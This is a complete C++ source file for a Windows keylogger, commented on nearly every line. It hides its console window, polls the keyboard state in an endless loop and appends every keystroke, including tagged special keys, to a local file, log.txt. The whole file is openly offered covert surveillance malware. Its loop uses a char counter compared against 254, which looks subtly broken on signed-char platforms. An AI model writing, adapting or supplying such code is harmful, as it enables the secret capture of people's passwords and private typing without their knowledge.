#include <iostream> // Includes the standard input-output stream library for console I/O
#include <windows.h> // Includes the Windows API header for Windows-specific functions
#include <winuser.h> // Includes the Windows user interface header for virtual key codes and input handling
#include <fstream> // Includes the file stream library for file operations
#include <string> // Includes the string library for string manipulation (not used in this code but often useful)
#include <thread> // Includes the thread library for multi-threading support, specifically for sleep functionality
#include <chrono> // Includes the chrono library for time-related functions, used for sleep duration
using namespace std; // Allows usage of standard library names without the std:: prefix

void StartLogging(); // Function prototype for StartLogging, which will handle the key logging process

int main(){
    // Hide the console window to prevent it from being visible during key logging
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    StartLogging(); // Call the StartLogging function to begin logging key presses
    return 0; // Return 0 to indicate successful execution of the program
}

void StartLogging(){
    // Open the log file in append mode to record key presses
    ofstream log("log.txt", ios::app); // Create an output file stream named 'log' for "log.txt"
    if (!log.is_open()) { // Check if the log file was opened successfully
        cerr << "Error opening log file!" << endl; // Output an error message to the console if it fails
        return; // Exit the function if the log file cannot be opened
    }

    char c; // Declare a character variable to store the key code
    // Infinite loop to continuously check for key presses
    while (true) {
        // Loop through all possible key codes (1 to 254)
        for(c=1; c<=254; c++){
            // Check if the key corresponding to the code 'c' is pressed
            if(GetAsyncKeyState(c) & 0x1 ) { // GetAsyncKeyState checks the state of the specified key
                switch (c) { // Switch statement to handle different key codes
                    // Handle special keys with specific log messages
                    case VK_BACK: // VK_BACK is the virtual key code for the backspace key
                        log << "[backspace]"; // Log the backspace action
                        break; // Exit the switch case
                    case VK_RETURN: // VK_RETURN is the virtual key code for the enter key
                        log << "[enter]"; // Log the enter action
                        break; // Exit the switch case
                    case VK_SHIFT: // VK_SHIFT is the virtual key code for the shift key
                        log << "[shift]"; // Log the shift action
                        break; // Exit the switch case
                    case VK_CONTROL: // VK_CONTROL is the virtual key code for the control key
                        log << "[control]"; // Log the control action
                        break; // Exit the switch case
                    case VK_CAPITAL: // VK_CAPITAL is the virtual key code for caps lock
                        log << "[cap]"; // Log the caps lock action
                        break; // Exit the switch case
                    case VK_TAB: // VK_TAB is the virtual key code for the tab key
                        log << "[tab]"; // Log the tab action
                        break; // Exit the switch case
                    case VK_MENU: // VK_MENU is the virtual key code for the alt key
                        log << "[alt]"; // Log the alt action
                        break; // Exit the switch case
                    case VK_LBUTTON: // VK_LBUTTON is the virtual key code for the left mouse button
                    case VK_RBUTTON: // VK_RBUTTON is the virtual key code for the right mouse button
                        // Do nothing for mouse button presses
                        break; // Exit the switch case
                    default: // Default case for all other keys
                        // Log the character corresponding to the key code
                        log << c; // Log the character represented by the key code
                }
                // Flush the log to ensure data is written immediately to the file
                log.flush(); // Ensures that the output buffer is written to the file
            }
        }
        // Introduce a small delay to reduce CPU usage
        std::this_thread::sleep_for(std::chrono::milliseconds(10)); // Sleep for 10 milliseconds
    }
    log.close(); // Close the log file (this line will not be reached in the current infinite loop)
}
